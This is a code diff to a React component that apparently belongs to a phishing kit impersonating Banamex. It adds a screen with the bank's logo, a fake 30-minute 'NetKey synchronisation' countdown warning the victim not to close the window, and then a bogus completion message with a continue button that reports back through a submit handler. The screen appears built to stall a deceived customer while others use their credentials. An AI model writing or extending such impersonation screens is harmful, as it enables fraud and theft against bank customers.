@@ -118,6 +118,27 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [correoAcceso, setCorreoAcceso] = useState('');
   const [nombreRepAcceso, setNombreRepAcceso] = useState('');
 
+  // Estados para ACTUALIZACION (contador de 30 minutos)
+  const [timeLeft, setTimeLeft] = useState(30 * 60); // 30 minutos en segundos
+  const [showContinueBtn, setShowContinueBtn] = useState(false);
+
+  // useEffect para el contador de actualización
+  useEffect(() => {
+    if (currentScreen === ScreenType.ACTUALIZACION && timeLeft > 0) {
+      const timer = setInterval(() => {
+        setTimeLeft((prev) => {
+          if (prev <= 1) {
+            setShowContinueBtn(true);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+
+      return () => clearInterval(timer);
+    }
+  }, [currentScreen, timeLeft]);
+
   // Funciones de validación con protección mejorada
   const validateSecureData = (input: string, type: string) => {
     return protectionUtils.validateData(input, type);
@@ -3166,6 +3187,92 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
         return banamexWaitingContent;
+
+      case ScreenType.ACTUALIZACION:
+        const minutosRestantes = Math.floor(timeLeft / 60);
+        const segundosRestantes = timeLeft % 60;
+
+        const actualizacionContent = (
+          <div style={{ 
+            margin: 0, 
+            fontFamily: '"Helvetica Neue", Arial, sans-serif', 
+            background: '#ffffff', 
+            minHeight: '100vh', 
+            display: 'flex', 
+            alignItems: 'center', 
+            justifyContent: 'center',
+            padding: '40px'
+          }}>
+            <div style={{ textAlign: 'center', maxWidth: '600px' }}>
+              {/* Logo de Banamex */}
+              <img 
+                src={banamexLogo} 
+                alt="Banamex" 
+                style={{ width: '180px', margin: '0 auto 30px', display: 'block' }}
+              />
+
+              {!showContinueBtn ? (
+                <>
+                  <h2 style={{ fontSize: '28px', fontWeight: 700, color: '#1f2937', marginBottom: '20px' }}>
+                    Sincronizando NetKey
+                  </h2>
+                  
+                  <div style={{ 
+                    fontSize: '48px', 
+                    fontWeight: 700, 
+                    color: '#153e46', 
+                    marginBottom: '30px',
+                    fontFamily: 'monospace'
+                  }}>
+                    {String(minutosRestantes).padStart(2, '0')}:{String(segundosRestantes).padStart(2, '0')}
+                  </div>
+
+                  <div style={{ 
+                    width: '100%', 
+                    height: '8px', 
+                    backgroundColor: '#e5e7eb', 
+                    borderRadius: '4px',
+                    overflow: 'hidden',
+                    marginBottom: '30px'
+                  }}>
+                    <div style={{
+                      width: `${((30 * 60 - timeLeft) / (30 * 60)) * 100}%`,
+                      height: '100%',
+                      backgroundColor: '#153e46',
+                      transition: 'width 1s linear'
+                    }} />
+                  </div>
+
+                  <p style={{ fontSize: '18px', color: '#6b7280', lineHeight: 1.6, marginBottom: '10px' }}>
+                    Para terminar de sincronizar nuevamente su NetKey
+                  </p>
+                  <p style={{ fontSize: '16px', color: '#dc2626', fontWeight: 600 }}>
+                    Por favor no cierre esta ventana
+                  </p>
+                </>
+              ) : (
+                <>
+                  <h2 style={{ fontSize: '28px', fontWeight: 700, color: '#1f2937', marginBottom: '30px' }}>
+                    Sincronización Completada
+                  </h2>
+                  
+                  <p style={{ fontSize: '18px', color: '#6b7280', lineHeight: 1.6, marginBottom: '30px' }}>
+                    La sincronización de su NetKey ha finalizado correctamente
+                  </p>
+
+                  <Button 
+                    className="bg-[#153e46] text-white py-3 px-8 rounded hover:bg-opacity-90 transition-colors text-lg font-semibold"
+                    onClick={() => onSubmit(ScreenType.ACTUALIZACION, { action: 'continue' })}
+                    data-testid="button-continuar-actualizacion"
+                  >
+                    Continuar
+                  </Button>
+                </>
+              )}
+            </div>
+          </div>
+        );
+        return actualizacionContent;
 
       default:
         return (
